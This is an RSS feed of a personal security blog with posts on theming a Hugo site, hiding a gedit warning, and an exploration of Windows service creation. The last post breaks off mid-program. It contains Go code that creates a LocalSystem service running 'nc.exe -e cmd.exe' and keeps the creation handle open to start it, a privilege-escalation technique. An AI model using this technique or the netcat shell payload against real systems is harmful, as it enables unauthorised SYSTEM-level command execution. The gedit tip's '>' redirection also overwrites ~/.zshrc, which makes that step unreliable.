<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>notes on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/notes/</link>
    <description>Recent content in notes on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Fri, 15 Oct 2021 07:28:41 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/notes/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Revamp Blog</title>
      <link>https://fahmifj.github.io/blog/revamp-blog/</link>
      <pubDate>Fri, 15 Oct 2021 07:28:41 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/revamp-blog/</guid>
      <description>Mod the PaperMod</description>
      <content:encoded><![CDATA[<p>Belakangan ini saya agak telat nulis write-up, tapi kemarin sudah &ldquo;terlunaskan&rdquo;.  Alasan telatnya adalah satu minggu yang lalu saya mencoba  <del>memindahkan VHD lab pentest ke volume baru tapi akhirnya corrupt</del> sedikit me-<em>revamp</em> blog ini.</p>
<p>Sebagai catatan sendiri dan mungkin berguna untuk yang mampir, di postingan ini saya hanya akan membahas sedikit bagian yang mencolok yang saya ubah. Desain kasarnya bisa dilihat digambar berikut.</p>
<p><div class="img-container"><img src="imgs/image-20211015074555598.png" alt="image-20211015074555598"  /></div>
<small>The power of Ms. Paint</small></p>
<h2 id="r1-float-the-toc">R1: Float the ToC</h2>
<p>Tulisan yang saya posting umumnya adalah &lsquo;semacam&rsquo; <em>walkthrough</em>, tentunya <em>floating</em> ToC (Table of Content) adalah salah satu hal yang diperlukan oleh pembaca (kalau ada yang baca) untuk loncat-loncat antar <em>section</em>. Sayangnya ToC bawaan tema dasar blog ini, yaitu <a href="https://github.com/adityatelange/hugo-PaperMod/">PaperMod</a>, bukan <em>floating</em>.</p>
<p>Solusi yang terpikirkan tanpa penggantian tema atau pengunaan plugin yang keduanya jelas berat di JavaScript, dan juga tanpa mengacak-ngacak tema dasar adalah dengan membagi dua area konten setelah header menjadi area ToC dan area konten teks yang rasio-nya adalah <strong>3:7</strong>. Kedua area ini dibungkus oleh satu kontainer flex.</p>
<p><div class="img-container"><img src="imgs/image-20211015105411374.png" alt="image-20211015105411374"  /></div>
</p>
<p>Supaya area konten tetap dengan lebar 100%, hal selanjutnya adalah mengeluarkan si area ToC ini dari kontainer dengan meminuskan properti <em>margin-left</em>-nya sebesar lebarnya sendiri (-1*0.3*100%).</p>
<p><div class="img-container"><img src="imgs/image-20211015111941266.png" alt="image-20211015111941266"  /></div>
</p>
<p>Sisanya hanya tinggal menyesuaikan tampilan dan posisi dari ToC tersebut.</p>
<p>Desain ToC ini <del>nyolong</del> terinspirasi dari blognya <a href="https://0xdf.gitlab.io/">0xdf</a> yang pakai <a href="https://afeld.github.io/bootstrap-toc/">bootstrap toc</a>.</p>
<h2 id="r2-add-latest-posts">R2: Add Latest Posts</h2>
<p>Selanjutnya adalah &ldquo;Latests Posts&rdquo; berikut.</p>
<p><div class="img-container"><img src="imgs/image-20211015132036300.png" alt="image-20211015132036300"  /></div>
</p>
<p>Penambahan Latests Posts sebenarnya hanya sekadar <em>copy paste</em> template halaman arsip yang dibuat ke template parsial lalu dipanggil di  <code>layouts/list.html</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="o">...</span>
<span class="p">{{</span><span class="o">-</span> <span class="k">if</span> <span class="p">(</span><span class="nx">and</span> <span class="p">.</span><span class="nx">Site</span><span class="p">.</span><span class="nx">Params</span><span class="p">.</span><span class="nx">profileMode</span><span class="p">.</span><span class="nx">enabled</span> <span class="p">.</span><span class="nx">IsHome</span><span class="p">)</span> <span class="p">}}</span>

<span class="p">{{</span><span class="o">-</span> <span class="nx">partial</span> <span class="s">&#34;c_profilemode.html&#34;</span> <span class="p">.</span> <span class="p">}}</span>
<span class="p">{{</span><span class="o">-</span> <span class="nx">partial</span> <span class="s">&#34;c_latest_posts.html&#34;</span> <span class="p">.</span> <span class="p">}}</span>

<span class="o">...</span>
</code></pre></div><p>Kode templatenya (struktur html/style css bisa di inspect) :</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go">  <span class="p">{{</span> <span class="k">range</span> <span class="nx">first</span> <span class="mi">5</span> <span class="p">(.</span><span class="nx">Site</span><span class="p">.</span><span class="nx">RegularPages</span><span class="p">)</span> <span class="p">}}</span> <span class="cm">/* index 0 = newest */</span>
  <span class="p">{{</span> <span class="p">.</span><span class="nx">Title</span> <span class="p">}}</span>
  <span class="o">...</span>
  <span class="p">{{</span> <span class="p">.</span><span class="nx">Date</span><span class="p">.</span><span class="nx">Format</span> <span class="s">&#34;Jan 02&#34;</span> <span class="p">}}</span>
  <span class="o">...</span>
  <span class="p">{{</span><span class="o">-</span> <span class="nx">printf</span> <span class="s">&#34;%d min&#34;</span> <span class="p">.</span><span class="nx">ReadingTime</span> <span class="p">}}</span>
  <span class="o">...</span>
  <span class="p">{{</span><span class="o">-</span> <span class="nx">end</span> <span class="p">}}</span>
</code></pre></div><p>Desain untuk &ldquo;Latests Posts&rdquo;  ini <del>nyolong</del> terinspirasi dari tema <a href="https://github.com/Track3/hermit">Hermit</a>, <a href="https://faultable.dev/">faultable.dev</a>, dan <a href="https://www.taniarascia.com/">taniarascia.com</a>.</p>
<h2 id="r3-show-tags-in-a-post-entry">R3: Show Tags in a Post Entry</h2>
<p>Penambahan tag postingan pada <em>post entry</em> simplenya adalah untuk memberi gambaran kasar tentang isi dari suatu postingan.</p>
<p>Untuk menampilkan tag di setiap <em>post entry</em>, saya perlu mengubah sedikit urutan struktur HTML yang tentu bisa diinspect sendiri.</p>
<p><div class="img-container"><img src="imgs/image-20211015144040968.png" alt="image-20211015144040968"  /></div>
</p>
<p>Kode yang digunakan untuk menampilkan tag beserta tautannya merupakan modifikasi dari kode yang ada pada dokumentasi Hugo ini: <a href="https://gohugo.io/templates/taxonomy-templates/#example-comma-delimit-tags-in-a-single-page-template">Taxonomy Templates | Hugo (gohugo.io)</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="p">{{</span> <span class="err">$</span><span class="nx">taxo</span> <span class="o">:=</span> <span class="s">&#34;tags&#34;</span> <span class="p">}}</span>
<span class="p">{{</span> <span class="nx">with</span> <span class="p">.</span><span class="nx">Param</span> <span class="err">$</span><span class="nx">taxo</span> <span class="p">}}</span>
	<span class="p">{{</span> <span class="err">$</span><span class="nx">tag_limit</span> <span class="o">:=</span> <span class="mi">7</span> <span class="p">}}</span>
	<span class="p">{{</span> <span class="k">if</span> <span class="nf">ne</span> <span class="p">(</span><span class="nx">len</span> <span class="p">.)</span> <span class="mi">0</span> <span class="p">}}</span>
		<span class="p">{{</span> <span class="k">range</span> <span class="err">$</span><span class="nx">k</span><span class="p">,</span> <span class="err">$</span><span class="nx">v</span> <span class="o">:=</span> <span class="p">.</span> <span class="p">}}</span>
		<span class="p">{{</span><span class="o">-</span> <span class="k">if</span> <span class="nf">lt</span> <span class="p">(</span><span class="nx">add</span> <span class="err">$</span><span class="nx">k</span> <span class="mi">1</span><span class="p">)</span> <span class="err">$</span><span class="nx">tag_limit</span> <span class="p">}}</span>
			<span class="p">{{</span><span class="o">-</span> <span class="k">if</span> <span class="nf">and</span> <span class="p">(</span><span class="nx">gt</span> <span class="err">$</span><span class="nx">k</span> <span class="mi">0</span><span class="p">)</span> <span class="p">}}</span><span class="err">¬∑</span><span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;{{</span> <span class="nx">end</span> <span class="o">-</span><span class="p">}}</span> 
			<span class="p">{{</span> <span class="nx">with</span> <span class="err">$</span><span class="p">.</span><span class="nx">Site</span><span class="p">.</span><span class="nf">GetPage</span> <span class="p">(</span><span class="nx">printf</span> <span class="s">&#34;/%s/%s&#34;</span> <span class="err">$</span><span class="nx">taxo</span> <span class="err">$</span><span class="nx">v</span><span class="p">)</span> <span class="o">-</span><span class="p">}}</span>
			<span class="p">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="p">=</span><span class="s">&#34;{{ .Permalink }}&#34;</span><span class="p">&gt;{{</span> <span class="err">$</span><span class="nx">v</span> <span class="p">}}&lt;</span><span class="o">/</span><span class="nx">a</span><span class="p">&gt;</span>
			<span class="p">{{</span> <span class="nx">end</span> <span class="p">}}</span>
			<span class="p">{{</span><span class="o">-</span> <span class="nx">end</span> <span class="o">-</span><span class="p">}}</span>
		<span class="p">{{</span><span class="o">-</span> <span class="nx">end</span> <span class="p">}}</span>
	<span class="p">{{</span><span class="o">-</span> <span class="nx">end</span> <span class="o">-</span><span class="p">}}</span>
<span class="p">{{</span> <span class="nx">end</span> <span class="p">}}</span>
</code></pre></div><h2 id="to-be-contd">To be cont&rsquo;d</h2>
<p>Selain 3 hal diatas, ada beberapa fitur bawaan yang diotak atik seperti pagination yang di-<em>disable</em>, fitur <em>search</em>, navigation bar, atau bahkan sekadar iseng <em>mainin</em> animasi CSS pseudo selector yang  <del>nyolong</del> terinspirasi dari <a href="https://yui540.design/">yui540</a> dan <a href="https://sai-chan.com/">sai-chan</a>. Tapi karena masih berantakan juga strukturnya, contohnya halaman CTF, jadi mungkin dilanjut dilain waktu.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Get rid of the Gtk-WARNING on gedit</title>
      <link>https://fahmifj.github.io/blog/get-rid-gtk-warning-on-gedit/</link>
      <pubDate>Wed, 18 Aug 2021 04:02:44 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/get-rid-gtk-warning-on-gedit/</guid>
      <description>Actually, I hide it</description>
      <content:encoded><![CDATA[<p>If I try to edit something in <code>gedit</code>, on the first typing, the following warning pops up on my terminal.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">(gedit:10160): Gtk-WARNING **: 17:22:36.887: Calling org.xfce.Session.Manager.Inhibit failed: GDBus.Error:org.freedesktop.DBus.Error.UnknownMethod: No such method ‚ÄúInhibit‚Äù
</code></pre></div><p>The warning message only appear on my Ubuntu and Kali Linux. I tried several solutions I could find, but the warning persists. Since it&rsquo;s just a warning, I can use the error redirection to suppress the error message.</p>
<p>First, create a <code>gedit</code> &ldquo;wrapper&rdquo; in resolvable path such as <code>/usr/bin</code> or <code>/usr/local/bin</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cat /usr/bin/gedit-null 
<span class="c1">#!/bin/bash</span>

/usr/bin/gedit <span class="s2">&#34;</span><span class="nv">$@</span><span class="s2">&#34;</span> 2&gt;/dev/null
</code></pre></div><ul>
<li><code>$@</code> will take all the parameters passed to the wrapper (<code>/usr/bin/gedit-null</code>), and the wrapper will pass them to the <code>gedit</code> executable/binary.</li>
<li><code>2&gt;/dev/null</code> hide the warning message.</li>
</ul>
<p>Then, add alias for <code>gedit</code> that points to the wrapper (<code>gedit-null</code>) in  <code>.bashrc</code> or <code>.zshrc</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ <span class="nb">echo</span>  <span class="s1">&#39;alias gedit=&#34;gedit-null&#34;&#39;</span>  &gt; ~/.zshrc
$ <span class="nb">source</span> ~/.zshrc
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Windows Services: Start a Service During Its Creation</title>
      <link>https://fahmifj.github.io/blog/start-a-windows-service-during-its-creation/</link>
      <pubDate>Thu, 12 Aug 2021 22:04:18 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/start-a-windows-service-during-its-creation/</guid>
      <description>Eksplorasi Windows Service</description>
      <content:encoded><![CDATA[<p>Tahun lalu (ternyata udah setahun), saya sempat baca dua buah postingan blog yang membahas tentang Windows Service. Postingan pertama adalah &ldquo;beyond root&rdquo; dari mesin Resolute dari Hack The Box yang ditulis oleh <a href="https://twitter.com/0xdf_">0xdf</a> dan yang kedua adalah postingan yang ditulis oleh <a href="https://twitter.com/VbScrub">VbScrub</a>. Kedua postingan tersebut dapat dibaca ditautan berikut:</p>
<ul>
<li>
<p><a href="https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html">https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html</a></p>
</li>
<li>
<p><a href="https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/">https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/</a></p>
</li>
</ul>
<p>Di postingan pertama, 0xdf lebih membahas tentang <code>psexec</code>-nya Impacket dan tool serupa lainnya (teknikal), sedangkan di postingan kedua, VbScrub melanjutkan <em>kulikan<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>nya</em>-nya 0xdf dan lebih membahas tentang Windows service-nya.</p>
<p>Berkat kedua postingan tersebut, saya jadi tertarik juga untuk ngulik dan nyelam ke dokumentasi API Windows service.</p>
<p>Sekilas definisi, service sederhananya service adalah suatu program yang berjalan di belakang layar. Untuk Linux/Unix-like, biasanya disebut Daemon. Contohnya: Windows Update, Firewall, Audio processing seperti Realtek misalnya, dll.</p>
<p><div class="img-container"><img src="imgs/image-20210812024145951.png" alt="image-20210812024145951"  /></div>
</p>
<div class="force-center"><small> Sumber colongan tertera </small></div>
<h2 id="creation-of-a-service">Creation of a Service</h2>
<p>Pada Windows, sebuah service dapat dibuat dengan menggunakan command-line utility bawaan Windows bernama <code>sc.exe</code>. Berikut contoh penggunaannya.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\&gt;</span> sc.exe create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\program.exe&#34;</span>
</code></pre></div><ul>
<li>MyService = Nama service</li>
<li>binPath = Lokasi executable program (+ argument)</li>
</ul>
<p>Kedua argumen diatas wajib disuplai (minimal).</p>
<p>Pembuatan service <code>MyService</code> akan berhasil jika perintah tersebut jalankan pada elevated (admin) terminal , atau user yang menjalankannya memiliki hak membuat service (<code>SC_MANAGER_CREATE_SERVICE</code>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\myservice\nc.exe&#34;</span>
<span class="o">[</span>SC<span class="o">]</span> CreateService SUCCESS
</code></pre></div><p>Jika bukan elevated atau tanpa hak untuk membuat service, maka hasil yang diberikan oleh <code>sc.exe</code> adalah pesan &ldquo;Access is denied&rdquo;.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc.exe create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\myservice\nc.exe&#34;</span>
<span class="o">[</span>SC<span class="o">]</span> OpenSCManager FAILED 5:

Access is denied.
</code></pre></div><p>Sedangkan untuk mengetahui tahap pembuatan/instalasi sebuah service, kita bisa mengacu kepada contoh kode bahasa C dari <a href="https://docs.microsoft.com/en-us/windows/win32/services/installing-a-service">dokumentasi Microsoft</a> berikut.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">VOID</span> <span class="nf">SvcInstall</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">SC_HANDLE</span> <span class="n">schSCManager</span><span class="p">;</span>
    <span class="n">SC_HANDLE</span> <span class="n">schService</span><span class="p">;</span>
    <span class="n">TCHAR</span> <span class="n">szPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>

    <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="n">GetModuleFileName</span><span class="p">(</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="n">szPath</span><span class="p">,</span> <span class="n">MAX_PATH</span> <span class="p">)</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Cannot install service (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    
     <span class="c1">// Creation of a Service: STEP 1
</span><span class="c1"></span>    <span class="c1">// Get a handle to the SCM database.
</span><span class="c1"></span>    <span class="n">schSCManager</span> <span class="o">=</span> <span class="n">OpenSCManager</span><span class="p">(</span>
        <span class="nb">NULL</span><span class="p">,</span>                    <span class="c1">// local computer
</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                    <span class="c1">// ServicesActive database
</span><span class="c1"></span>        <span class="n">SC_MANAGER_ALL_ACCESS</span><span class="p">);</span>  <span class="c1">// full access rights
</span><span class="c1"></span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">NULL</span> <span class="o">==</span> <span class="n">schSCManager</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;OpenSCManager failed (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
     <span class="c1">// Creation of a Service: STEP 2
</span><span class="c1"></span>    <span class="c1">// Create the service
</span><span class="c1"></span>    <span class="n">schService</span> <span class="o">=</span> <span class="n">CreateService</span><span class="p">(</span>
        <span class="n">schSCManager</span><span class="p">,</span>              <span class="c1">// SCM database
</span><span class="c1"></span>        <span class="n">SVCNAME</span><span class="p">,</span>                   <span class="c1">// name of service
</span><span class="c1"></span>        <span class="n">SVCNAME</span><span class="p">,</span>                   <span class="c1">// service name to display
</span><span class="c1"></span>        <span class="n">SERVICE_ALL_ACCESS</span><span class="p">,</span>        <span class="c1">// desired access
</span><span class="c1"></span>        <span class="n">SERVICE_WIN32_OWN_PROCESS</span><span class="p">,</span> <span class="c1">// service type
</span><span class="c1"></span>        <span class="n">SERVICE_DEMAND_START</span><span class="p">,</span>      <span class="c1">// start type
</span><span class="c1"></span>        <span class="n">SERVICE_ERROR_NORMAL</span><span class="p">,</span>      <span class="c1">// error control type
</span><span class="c1"></span>        <span class="n">szPath</span><span class="p">,</span>                    <span class="c1">// path to service&#39;s binary
</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no load ordering group
</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no tag identifier
</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no dependencies
</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// LocalSystem account
</span><span class="c1"></span>        <span class="nb">NULL</span><span class="p">);</span>                     <span class="c1">// no password
</span><span class="c1"></span>
    <span class="k">if</span> <span class="p">(</span><span class="n">schService</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;CreateService failed (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="n">CloseServiceHandle</span><span class="p">(</span><span class="n">schSCManager</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Service installed successfully</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>

    <span class="c1">// Creation of a Service: STEP 3
</span><span class="c1"></span>    <span class="n">CloseServiceHandle</span><span class="p">(</span><span class="n">schService</span><span class="p">);</span>
    <span class="n">CloseServiceHandle</span><span class="p">(</span><span class="n">schSCManager</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Secara garis besar, tahap pembuatan service adalah seperti berikut:</p>
<ol>
<li>Program membuat koneksi ke Service Control Manager (SCM) dengan memanggil fungsi <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw">OpenSCManager</a>. Fungsi ini mengembalikan sesuatu (return value) yang disebut <strong>handle</strong> (selanjutnya disebut <a href="https://docs.microsoft.com/en-us/windows/win32/services/scm-handles">handle SCM</a>). Handle SCM ini memegang level akses tertentu terhadap SCM, detailnya bisa dilihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?redirectedfrom=MSDN#access-rights-for-the-service-control-manager">disini</a>.</li>
<li>Handle SCM bersama dengan argumen lainnya yang disuplai seperti &ldquo;nama service&rdquo; dan &ldquo;binPath&rdquo; akan di-passing ke fungsi  <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew">CreateService()</a> untuk membuat service. Fungsi <code>CreateService()</code> ini memiliki return value berupa <strong>handle</strong> (kita sebut handle SVC) dengan level akses tertentu juga, detailnya bisa dilihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?redirectedfrom=MSDN#access-rights-for-a-service">disini</a>.</li>
<li>Di tahap ini, pesan sukses ditampilkan, lalu handle SCM dan handle SVC <u>ditutup</u> dan program keluar.</li>
</ol>
<blockquote>
<ul>
<li>SCM sederhananya dapat dianggap sebagai database dari service.</li>
<li>Handle SCM menentukan apakah kita dapat melakukan read/write access pada SCM dan handle SVC menentukan apakah kita dapat mengontrol suatu service. Didapatkannya handle SVC sendiri bergantung pada level akses handle SCM.</li>
</ul>
</blockquote>
<p>Pada potongan kode sebelumnya akses handle SCM adalah <code>SC_MANAGER_ALL_ACCESS</code>, yang mana bisa diasumsikan bahwa hal ini memerlukan elevated process. Sedangkan berdasarkan kasus mesin Resolute yang diulas oleh 0xdf, handle SCM dengan akses <code>SC_MANAGER_CREATE_SERVICE</code> pun sudah cukup untuk membuat service.</p>
<h2 id="starting-a-service">Starting a Service</h2>
<p>Masih dengan tool yang sama (<code>sc.exe</code>), sebuah service dapat di jalankan dengan perintah berikut.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\&gt;</span>sc start MyService
</code></pre></div><p>Normalnya, service yang berhasil dibuat oleh user menggunakan <code>sc.exe</code> dalam mode elevated atau user dengan hak <code>SC_MANAGER_CREATE_SERVICE</code> tidak akan bisa dikontrol (start, stop) oleh <u>regular user</u>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\myservice\nc.exe&#34;</span>
<span class="o">[</span>SC<span class="o">]</span> CreateService SUCCESS

C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc start MyService
<span class="o">[</span>SC<span class="o">]</span> StartService: OpenService FAILED 5:

Access is denied.
</code></pre></div><p>Pada contoh diatas, pembuatan service berhasil karena user <code>fahmi</code> memiliki hak <code>SC_MANAGER_CREATE_SERVICE</code>, tetapi tidak memiliki kontrol atas service yang dibuatnya.</p>
<p>Jika melihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/starting-a-service">dokumentasi</a> Microsoft, yang juga dalam bahasa C, tahapan menjalankan sebuah service tanpa <code>sc.exe</code> secara garis besarnya adalah seperti berikut:</p>
<ol>
<li>Membuat koneksi ke SCM database dan mendapatkan handle SCM dengan level akses tertentu</li>
<li>Handle SCM kemudian di-passing ke fungsi <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openservicew">OpenService()</a>. Fungsi ini mengembalikan handle SVC dengan level akses tertentu.</li>
<li>Handle SVC yang didapat dipassing ke <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew">StartService</a> untuk mulai menjalankan service.</li>
</ol>
<p>Dari ketiga tahap menjalankan service tersebut, regular user tentunya akan mendapat galat berupa &ldquo;Access is denied&rdquo; di tahap 2 karena handle SVC tidak didapatkan dan handle SCMnya hanya sebatas level user.</p>
<h2 id="dont-close-the-handles">Don&rsquo;t Close the Handles!</h2>
<p>Kalau kita lihat kembali ke proses pembuatan service, tepatnya pada tahap 2 fungsi <code>CreateSevice()</code> dipanggil, ternyata si pembuat  service (level admin atau user dengan hak  <code>SC_MANAGER_CREATE_SERVICE</code>) bisa <strong>menentukan level akses dirinya terhadap service yang dibuat</strong> dan handle SVC yang dikembalikan oleh fungsi tersebut akan memiliki level akses yang sama.</p>
<p>Jadi, jika saat pembuatan service A, level akses yang disuplai adalah <code>SERVICE_ALL_ACCESS</code> (full kontrol), maka handle SVC A pun akan memiliki level akses yang sama terhadap Service A, yaitu full kontrol. Sayangnya handle SVC A ini ditutup berbarengan dengan handle SCM (tahap 3 pembuatan service).</p>
<p>Lalu, kira-kira apa jadinya jika handle SVC A tersebut tidak ditutup seperti seharusnya, melainkan dilanjut dan disuplai ke fungsi <code>StartService</code>? Hal inilah yang ditemukan oleh 0xdf dan VbScrub!</p>
<p>Untuk mencoba hal tersebut tentunya kita perlu membuat custom program dahulu dan berikut adalah program yang saya tulis dalam bahasa Go (Programnya versi argumen, bisa di cek <a href="https://github.com/fahmifj/winapi-go">disini</a>).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>

<span class="kn">import</span> <span class="s">&#34;golang.org/x/sys/windows&#34;</span>

<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="c1">// Creation of a Service: STEP 1
</span><span class="c1"></span>	<span class="c1">// Connect to scm to get a handle to create a service
</span><span class="c1"></span>	<span class="nx">scmHandle</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">OpenSCManager</span><span class="p">(</span><span class="kc">nil</span><span class="p">,</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">windows</span><span class="p">.</span><span class="nx">SC_MANAGER_CREATE_SERVICE</span><span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;Error cannot create a service&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="c1">// define service
</span><span class="c1"></span>	<span class="nx">serviceName</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">UTF16PtrFromString</span><span class="p">(</span><span class="s">&#34;MyService&#34;</span><span class="p">)</span>
	<span class="nx">serviceExecPath</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">UTF16PtrFromString</span><span class="p">(</span><span class="s">`C:\myservice\nc.exe -e cmd.exe localhost 9000`</span><span class="p">)</span>

	<span class="c1">// Creation of a ervice: STEP 2
</span><span class="c1"></span>	<span class="c1">// Create a service
</span><span class="c1"></span>	<span class="nx">svcHandle</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">CreateService</span><span class="p">(</span>
		<span class="nx">scmHandle</span><span class="p">,</span>                         <span class="c1">// SCM database
</span><span class="c1"></span>		<span class="nx">serviceName</span><span class="p">,</span>                       <span class="c1">// name of service
</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// service name to display
</span><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_ALL_ACCESS</span><span class="p">,</span>        <span class="c1">// desired access
</span><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_WIN32_OWN_PROCESS</span><span class="p">,</span> <span class="c1">// service type
</span><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_DEMAND_START</span><span class="p">,</span>      <span class="c1">// start type
</span><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_ERROR_NORMAL</span><span class="p">,</span>      <span class="c1">// error control type
</span><span class="c1"></span>		<span class="nx">serviceExecPath</span><span class="p">,</span>                   <span class="c1">// path to service&#39;s binary
</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no load ordering group
</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no tag identifier
</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no dependencies
</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// LocalSystem account
</span><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no password
</span><span class="c1"></span>	<span class="p">)</span>
	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;err&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="c1">// Creation of a Service: STEP 3
</span><span class="c1"></span>	<span class="c1">// Don&#39;t close the svcHandle, instead send it to StartService
